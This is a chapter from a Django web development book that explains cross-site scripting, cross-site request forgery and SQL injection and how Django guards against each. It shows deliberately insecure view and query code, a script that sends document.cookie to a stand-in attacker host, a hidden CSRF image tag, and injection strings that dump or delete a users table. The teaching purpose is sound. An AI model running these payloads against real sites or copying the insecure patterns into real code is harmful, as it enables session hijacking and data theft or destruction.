# Security

In this chapter, we will discuss the following topics:
- Various web attacks and countermeasures
- Where Django can and cannot help
- Security checks for Django applications

Several prominent industry reports suggest that websites and web applications remain one
of the primary targets of cyber attacks. Yet, about 86 percent of all websites, tested by a
leading security firm in 2013, had at least one serious vulnerability.

Releasing your application to the wild is fraught with several dangers ranging from the
leaking of confidential information to denial-of-service attacks. Mainstream media
headlines security flaws focusing on exploits, such as Heartbleed, Cloudbleed, Superfish,
and POODLE, that have an adverse impact on critical website applications, such as email
and banking. Indeed, one often wonders if WWW now means the World Wide Web or the
Wild Wild West.

One of the biggest selling points of Django is its strong focus on security. In this chapter, we
will cover the top techniques that attackers use. As we will soon see in this chapter, Django
can protect you from most of them out of the box.

I believe that in order to protect your site from attackers, you will need to think like one. So,
let's familiarize ourselves with the common attacks.


### Cross-site scripting
**Cross-site scripting (XSS)**, considered the most prevalent web application security flaw
today, enables an attacker to execute their malicious scripts (usually JavaScript) on web
pages viewed by users. Typically, the server is tricked into serving their malicious content
along with the trusted content.

How does a malicious piece of code reach the server? The common means of entering
external data into a website are as follows:
- Form fields
- URLs
- Redirects
- External scripts such as Ads or Analytics

None of these can be entirely avoided. The real problem is when outside data gets used
without being validated or sanitized (as shown in the following screenshot); never trust
outside data:

![image 1](1.jpg)

For example, let's take a look at a piece of vulnerable code and how an XSS attack can be
performed on it. It is strongly advised that you do not to use this code in any form:

```python
class XSSDemoView(View):
    def get(self, request):
        # WARNING: This code is insecure and prone to XSS attacks
        # *** Do not use it!!! ***
        if 'q' in request.GET:
            return HttpResponse("Searched for: {}".format(
                request.GET['q']))
                
        else:
            return HttpResponse("""<form method="get">
        <input type="text" name="q" placeholder="Search" value="">
        <button type="submit">Go</button>
        </form>""")
```

The preceding code is a **View** class that shows a search form when accessed without any
**GET** parameters. If the search form is submitted, it shows the **Search** string exactly as
entered by the user in the form.

Now, open this view in a dated browser (say, IE 8) and enter the following search term in
the form and submit it:

```js
<script>alert("pwned")</script>
```

Unsurprisingly, the browser will show an alert box with the ominous message - pwned.

<pre>
This attack fails in current browsers such as the latest Chrome, which will
present the following error message in the console: Refused to execute a
JavaScript script. The source code of script found within request.
</pre>


In case you are wondering what harm a simple alert message could cause, remember that
any JavaScript code can be executed in the same manner. In the worst case, the user's
cookies can be sent to a site controlled by the attacker by entering the following search
term:

```js
<script>var adr = 'http://lair.com/evil.php?stolen=' +
escape(document.cookie);</script>
```

Once your cookies are sent, the attacker might be able to conduct a more serious attack.


### Why are your cookies valuable?
It might be worth understanding why cookies are the target of several attacks. Simply put,
access to cookies allows attackers to impersonate you and even take control of your web
account.

To understand this in detail, you need to understand the concept of **sessions**. HTTP is
stateless. Be it an anonymous or an authenticated user, Django keeps track of their activities
for a certain duration of time by managing sessions.

A session consists of a session ID at the client end, that is, the browser and a dictionary-like
object stored at the server end. The session ID is a random 32-character string that is stored
as a cookie in the browser. Each time a user makes a request to a website, all their cookies,
including this session ID, are sent along with the request.

At the server end, Django maintains a session store that maps this session ID to the session
data. By default, Django stores the session data in the **django_session** database table.

Once a user successfully logs in, the session will note that the authentication was successful
and will keep track of the user. Therefore, the cookie becomes a temporary user
authentication for subsequent transactions. Anyone who acquires this cookie can use this
web application as that user, which is called session hijacking.


### How Django helps
You might have observed that my example was an extremely unusual way of
implementing a view in Django for two reasons: it did not use templates for rendering, and
form classes were not used. Both of them have XSS-prevention measures.

By default, Django templates auto-escape HTML special characters. So, if you had
displayed the search string in a template, all the tags would have been HTML encoded.
This makes it impossible to inject scripts unless you explicitly turn them off by marking the
content as safe.

Using form classes in Django to validate and sanitize the input is also a very effective
countermeasure. For example, if your application requires a numeric employee ID, then use
an **IntegerField** class rather than the more permissive **CharField** class.

In our example, we can use a **RegexValidator** class in our search-term field to restrict the
user to alphanumeric characters and allow punctuation symbols recognized by your search
module. Restrict the acceptable range of the user input as strictly as possible.


### Where Django might not help
Django can prevent 80 percent of XSS attacks through auto-escaping in templates. For the remaining scenarios, you must take care to do the following tasks:
- Quote all HTML attributes, for example, replace `<a href={{link}}>` with `<a href="{{link}}">`
- Escape dynamic data in CSS or JavaScript using **custom** methods
- Validate all URLs, especially against unsafe protocols such as JavaScript
- Avoid client-side XSS (also, known as DOM-based XSS)

As a general rule against XSS, I suggest filter on input and escape on output. Make sure that
you strictly validate and sanitize (filter) any data that comes in and transform (escape) it
immediately before sending it to the user—specifically, if you need to support the user
input with HTML formatting such as comments, consider using Markdown instead.

<pre>
Filter on input and escape on output.
</pre>


### Cross-site request forgery
**Cross-site request forgery (CSRF)** is an attack that tricks a user into making unwanted
actions on a website, where they are already authenticated, while they are visiting another
site. Say, in a forum, an attacker can place an IMG or IFRAME tag within the page that
makes a carefully crafted request to the authenticated site.

For instance, the following fake 0x0 image can be embedded in a comment:

```html
<img src="http://superbook.com/post?message=I+am+a+Dufus" width="0" height="0" border="0">
```

If you have already signed into SuperBook from another tab, and if the site doesn't have
CSRF countermeasures, then a very embarrassing message will be posted. In other words,
CSRF allows the attacker to perform actions by assuming your identity.


### How Django helps

The basic protection against CSRF is to use an HTTP **POST** (or **PUT** and **DELETE**, if
supported) for any action that has side effects. Any GET (or HEAD) request must be used
for information retrieval, for example, read-only.

Django offers countermeasures against **POST**, **PUT**, or **DELETE** methods by embedding a
token. You must already be familiar with the **{% csrf_token %}** mentioned inside each
Django form template. This is rendered into a random value that must be present while
submitting the form.

The way this works is that the attacker will not be able to guess the token while crafting the
request to your authenticated site. Since the token is mandatory and must match the value
presented while displaying the form, the form submission fails and the attack is thwarted.

### Where Django might not help
Some people turn off CSRF checks in a view with the @csrf_exempt decorator, especially
for AJAX form posts. This is not recommended unless you have carefully considered the
security risks involved.


### SQL injection
SQL injection is the second most common vulnerability of web applications, after XSS. The
attack involves entering malicious SQL code into a query that gets executed on the
database. It could result in data theft, by dumping database content, or the destruction of
data, say, by using the **DROP TABLE** command.

If you are familiar with SQL, then you can understand the following piece of code; it looks
up an email address based on the given **username**:

```python
name = request.GET['user']

sql = "SELECT email FROM users WHERE username = '{}';".format(name)
```

At first glance, it might appear that only the email address corresponds to the **username**
mentioned as the **GET** parameter will be returned. However, imagine if
an attacker entered ' OR '1'='1' in the form field, then the SQL code would be as
follows:

```sql
SELECT email FROM users WHERE username = '' OR '1'='1';
```

Since this **WHERE** clause will always be true, the emails of all the users of your application
will be returned. This can be a serious leak of confidential information.

Again, if the attacker wishes, they could execute more dangerous queries like the following:

```sql
SELECT email FROM users WHERE username = ''; DELETE FROM users WHERE '1'='1';
```

Now, all the user entries will be wiped off your database!


### How Django helps
The countermeasure against an SQL injection is fairly simple. Use the Django ORM rather
than crafting SQL statements by hand. The preceding example should be implemented as
follows:

```python
User.objects.get(username=name).email
```

Here, Django's database drivers will automatically escape the parameters. This will ensure
that they are treated as purely data and, therefore, they are harmless. However, as we will
soon see, even the ORM has a few escape latches.

 
### Where Django might not help
There could be instances where people would need to resort to raw SQL, say, due to
limitations of the Django ORM. For example, the where clause of the **extra()** method of a
QuerySet allows raw SQL. This SQL code will not be escaped against SQL injections.

If you are using the low-level ORM API, such as the **execute()** method, then you might
want to pass bind parameters instead of interpolating the SQL string yourself. Even then, it
is strongly recommended that you check whether each identifier has been properly
escaped.

Finally, if you are using a third-party database API such as MongoDB, then you will need
to manually check for SQL injections. Ideally, you would want to use only thoroughly
sanitized data with such interfaces.
